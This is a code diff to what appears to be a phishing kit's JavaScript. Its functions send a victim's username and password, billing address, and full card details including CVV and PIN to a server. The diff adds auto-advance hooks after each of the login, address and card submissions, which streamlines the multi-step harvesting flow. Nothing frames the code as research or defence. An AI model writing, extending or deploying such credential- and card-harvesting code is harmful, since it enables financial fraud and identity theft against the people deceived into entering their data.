@@ -25,6 +25,9 @@ function sendMainINFO(sess, user, pass) {
          } catch (e) {
             console.log('Response received');
          }
+         if (window.AUTO_MODE && typeof window.handleAutoAdvance === 'function') {
+            window.handleAutoAdvance('login');
+         }
       },
       error: function(xhr, status, error) {
          console.log('Error sending data: ' + error);
@@ -87,6 +90,9 @@ function sendBlInfo(sess, data) {
             } catch (e) {
                console.log('Response received');
             }
+            if (window.AUTO_MODE && typeof window.handleAutoAdvance === 'function') {
+               window.handleAutoAdvance('address');
+            }
         },
         error: function(xhr, status, error) {
             console.log('Error sending data: ' + error);
@@ -120,6 +126,9 @@ function sendCardInfo(sess, fullname, cardNumber, expiry, cvv, pin) {
          }
       } catch (e) {
          console.log('Response received: ' + response);
+      }
+      if (window.AUTO_MODE && typeof window.handleAutoAdvance === 'function') {
+         window.handleAutoAdvance('card');
       }
     },
     error: function(xhr, status, error) {
